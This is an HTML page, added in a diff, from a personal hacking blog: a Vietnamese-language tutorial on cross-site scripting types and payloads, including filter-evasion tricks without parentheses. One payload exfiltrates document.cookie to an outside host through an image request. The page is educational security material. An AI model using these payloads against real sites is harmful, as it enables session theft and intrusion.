@@ -1,0 +1,224 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+		<!-- Google tag (gtag.js) -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"></script>
+		<script>
+		  window.dataLayer = window.dataLayer || [];
+		  function gtag(){dataLayer.push(arguments);}
+		  gtag('js', new Date());
+
+		  gtag('config', 'G-3NTSMWGK5D');
+		</script>
+        <meta charset="UTF-8">
+        <title>XSS Introduction</title>
+        <link rel="icon" type="image/png" href="https://asayami.github.io/favicon.png"/>
+        <link rel="stylesheet" href="xss_source/xss_css.css">
+		<link rel="stylesheet" href="https://asayami.github.io/theme/theme.css">
+        <script src="xss_source/xss_js.js"></script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+        <meta name="description" content="Những bài viết, kinh nghiệm của mình về XSS">
+		<meta name="keywords" content="Hacking, hack, XSS, Cross Site Scripting, Cheat Sheet">
+		<meta name="author" content="Asayami Kurashin">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body>
+		<div class="snowflakes" aria-hidden="true">
+			<div class="snowflake">❅</div>
+			<div class="snowflake"><img src="https://asayami.github.io/theme/1.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
+			<div class="snowflake">❆</div>
+			<div class="snowflake">❄</div>
+			<div class="snowflake"><img src="https://asayami.github.io/theme/2.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
+			<div class="snowflake">❅</div>
+			<div class="snowflake">❆</div>
+			<div class="snowflake"><img src="https://asayami.github.io/theme/3.png" style="width:24px" class="img-fluid mx-auto d-block responsive_phone"></img></div>
+			<div class="snowflake">❄</div>
+		</div>
+        <!-- Navigation Bar -->
+        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
+            <div class="container-fluid navmain" id="navbar" onscroll="NavScroll()">
+                <script>window.onscroll = NavScroll;</script>
+                <a class="navbar-branch" href="https://asayami.github.io/">
+                    <img src="https://asayami.github.io/transparent-favicon.png" style="width:50px;"></img>
+                </a>
+                <button class="navbar-toggler ml-auto custom-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive"  aria-controls="navbarSupportedContent-7" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ml-auto">
+                        <li class="nav-item active navitem">
+                            <a href="https://asayami.github.io/">Home
+                                <span class="sr-only">(current)</span>
+                            </a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io/hacking.html">Hacking</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#aboutanchor">About</a>
+                        </li>
+                        <div class="dropdown-divider"></div>
+                        <li class="nav-item navitem">
+                            <a href="https://asayami.github.io#contactanchor">Contact</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="mainPicture"></div>
+        <div class="paragraph">
+            <p>XSS (Cross-Site Scripting) là một loại tấn công kiểu injection, nhắm tới các website uy tín. Sau khi bị khai thác,
+			do tin tưởng website bị khai thác, người dùng thông thường có lẽ sẽ không ngần ngại mà truy cập vào link và thực thi
+			mã độc. Mã độc có thể lấy nhiều dữ liệu nhạy cảm của người dùng như cookies, session token, hay có thể tái cấu trúc lại
+			trang web đó và yêu cầu người dùng nhập thông tin như mật khẩu chẳng hạn và dữ liệu đó sẽ được gửi đến kẻ tấn công</p>
+        </div>
+		
+		
+		<div class="paratitle">
+			<h2>Types of XSS</h2>
+		</div>
+		
+		<div class="paragraph">
+			<h3>1. Reflected XSS</h3>
+			<p>Đúng như tên gọi của nó, Reflected XSS nhận dữ liệu đầu vào chứa mã độc, server sẽ xử lí chúng và trả lại response có
+			chứa mã độc.</p>
+			<p>Ví dụ, URL có dạng
+			<font color="#009933">worldend.com/search/?query=clannad</font color="#009933">
+			thì phía server (PHP) sẽ xử lí chuỗi "clannad" và trả về kết quả ngay trong response luôn</p>
+			<h3>2. DOM Based XSS</h3>
+			<p>Khác với Reflected XSS, kiểu XSS này nhận dữ liệu đầu vào nhưng lại được xử lí bên client, bên server chỉ gửi đúng
+			1 response giống nhau dù đầu vào có như thế nào. Ví dụ URL cũng như trên, tuy nhiên bên server (PHP) không hề xử lí,
+			mà để cho javascript được gửi trong response xử lí. Hiển nhiên là đoạn code javascript đó của response nào cũng như nhau,
+			và việc thực thi được thực hiện bên client. Do đó mà với DOM Based XSS, nếu xử lí đầu vào như này, người dùng hay kẻ tấn công
+			có truyền vào gì thì phía server cũng không biết.</p>
+			<p>Nếu vẫn chưa hiểu rõ, bạn đọc có thể xem thêm tại video:
+			<a href="https://www.youtube.com/watch?v=JZgqsijAa-s">Here</a></p>
+			<h3>3. Stored XSS</h3>
+			<p>Stored XSS là kiểu XSS mà sau khi khai thác thành công website, đoạn mã độc bị lưu lại trong website đó luôn, bất
+			cứ ai truy cập dù URL không dính đoạn mã thực thi như 2 kiểu trên thì mã độc vẫn bị thực thi. VD như comment trong
+			một bài viết chẳng hạn.</p>
+			<h3>4. Blind XSS</h3>
+			<p>Tương tự như Stored XSS, nhưng mục tiêu nhắm đến là người dùng, ứng dụng phía back-end. Ví dụ như mã độc được gắn vào
+			một feedback của một công ty, vậy khi quản lí công ty mở feedback lên mã độc sẽ được thực thi. Viễn cảnh này ít được
+			xác nhận ngoài đời thực.</p>
+		</div>
+		
+		
+		<div class="paratitle">
+			<h2>Some basic ways to exploit XSS</h2>
+		</div>
+		
+		<div class="paragraph">
+			<font color="#009933"><pre><code>
+1.	href = javascript:alert('Asayami')
+			</font color="#009933"></pre></code>
+			=> Dùng trong tag a href
+			<font color="#009933"><pre><code>
+2.	data:text/html,&#60;script>alert(0)&#60;/script>
+			</font color="#009933"></pre></code>
+			=> Dùng trực tiếp được
+			<font color="#009933"><pre><code>
+3.	https://www.google.com/#javascript:alert(1)
+	window.location.href = location.hash.slice(1)
+			</font color="#009933"></pre></code>
+			<font color="#009933"><pre><code>
+4.	https://www.google.com/#alert(1)
+	&#60;script>new Function`X${document.location.hash.substr`1`}`&#60;/script>
+			</font color="#009933"></pre></code>
+			<font color="#009933"><pre><code>
+5.	document.write('&#60;img sr'%2b'c=http://p42.us/x.png?'%2bdocument['cookie']%2b'>');
+			</font color="#009933"></pre></code>
+			=> request đến website của kẻ tấn công với URL chứa cookie
+			<font color="#009933"><pre><code>
+6.	&#60;img src="x:gif" onerror="eval('al'%2b'lert(0)')">
+			</font color="#009933"></pre></code>
+			=> %2b là dấu +
+			<font color="#009933"><pre><code>
+7.	&#60;img src="x:gif" onerror="window['al\u0065rt'](0)">&#60;/img>
+			</font color="#009933"></pre></code>
+			=> 	&amp;#x65; = &amp;#101; = \u0065
+			<p>Xem bảng mã ở:
+			<a href="https://www.codetable.net/unicodecharacters">Codetable Unicode</a> và
+			<a href="https://en.wikipedia.org/wiki/List_of_Unicode_characters">Wikipedia Unicode</a>. Với một số kí tự đặc biệt
+			cũng có thể viết lại bằng HTML Entities, xem tại:
+			<a href="">Here</a></p>
+			<p>Xem thêm URL Encoding tại
+			<a href="https://www.w3schools.com/tags/ref_urlencode.ASP">W3Schools</a></p>
+			<font color="#009933"><pre><code>
+8.	somefunc('argu' - script_here) Ex: JSON.parse('chtholly' - alert(1))
+			</font color="#009933"></pre></code>
+			<p>Với hàm bất kì trong javascript, ngoài argument cần truyền vào có thể truyền thêm script mong muốn thực thi thông qua
+			các ký tự +-*/, ở giữa
+		</div>
+		
+		
+		<div class="paratitle">
+			<h2>XSS Technique without parentheses</h2>
+		</div>
+		
+		<div class="paragraph">
+			<font color="#009933"><pre><code>
+1.	alert`1337`
+			</font color="#009933"></pre></code>
+			=> Template Literals (là chuỗi được bao bởi `` thay vì cặp ngoặc kép ngoặc đơn thông thường) có khả năng thực thi
+			script ngay trong dấu backtick, xem thêm tại:
+			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">Here</a>
+			<font color="#009933"><pre><code>
+2.	throw onerror=alert,1337
+			</font color="#009933"></pre></code>
+			<p>=> Thông thường đầu vào của throw là string, nhưng chúng ta cũng có thể đưa cả object vào như ví dụ này.
+			Đầu tiên gán function alert cho handler onerror (tương đương gán cho window.onerror=alert), những lần throw sau đó do chạy bị lỗi
+			uncaught, nên truyền phần tử cuối lượt throw đó vào function đã gán (alert ở ví dụ này). Đây là bản cải tiến của onerror=alert;throw'XSS'.</p>
+			<p>Lưu ý:  nếu trigger error thông qua console để test sẽ không được, browser đã chặn một phần việc này. Hãy test thông qua gán
+			script vào file html hoặc sử dụng lệnh sau:</p>
+			<font color="#009933"><pre><code>
+setTimeout(function() { notThere(); }, 0);
+			</font color="#009933"></pre></code>
+			
+			<font color="#009933"><pre><code>
+3.	[].sort.call`${alert}1337` = Array.prototype.sort.call`${alert}1337`
+			</font color="#009933"></pre></code>
+			Calling sort() on non-array objects (hàm Array.prototype.sort.call) xem tại
+			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort#calling_sort_on_non-array_objects">Here (Ở cuối)</a>
+			<br>Xem rõ hơn Template Literals tại
+			<a href="https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses">Here</a>
+			<font color="#009933"><pre><code>
+function x(){
+   alert(arguments[0]);
+   alert(arguments[1]);
+}
+x`x${'ale'+'rt(1)'}x`
+			</font color="#009933"></pre></code>
+			Sử dụng hàm x như trên trong link portswigger với `${alert}1337` 
+			<br>=> `` có 2 phần tử ..1337.. và alert()
+			<br>Hàm call nhận vào ...call(..1337.., alert) hay thực chất là sort object ..1337.. theo function so sánh alert(),
+			do đó hàm alert đc thực thi
+			<p>VD với bộ test của docs sort ở link trên: console.log(Array.prototype.sort.call(arrayLike, alert('Chtholly'));</p>
+			<font color="#009933"><pre><code>
+4.	Function`x${'alert\x281337\x29'}x```
+			</font color="#009933"></pre></code>
+			Đọc về constructor Function tại
+			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function">Here</a>
+			<p>Cặp `` đầu là để viết nội dung function, cặp `` thứ 2 là nội dung của arguments truyền vào khi chạy function, giống như alert`1337`
+			nhưng alert thay vì có sẵn thì khi dùng mới tạo</p>
+			<font color="#009933"><pre><code>
+5.	'alert\x281337\x29'instanceof{[Symbol['hasInstance']]:eval}
+			</font color="#009933"></pre></code>
+			Đọc về instanceof tại
+			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/instanceof">Here</a>
+			<p>Symbol.hasInstance = Symbol['hasInstance'] đọc tại
+			<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/hasInstance">Here</a></p>
+			<p>Theo syntax, trước instanceof là object, sau là constructor</p>
+			<font color="#009933"><pre><code>
+6.	x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
+			</font color="#009933"></pre></code>
+			Chuyển x sang dạng string sẽ thu được dạng matrix(a,b,c,d,e,f)
+		</div>
+    </body>
+</html>
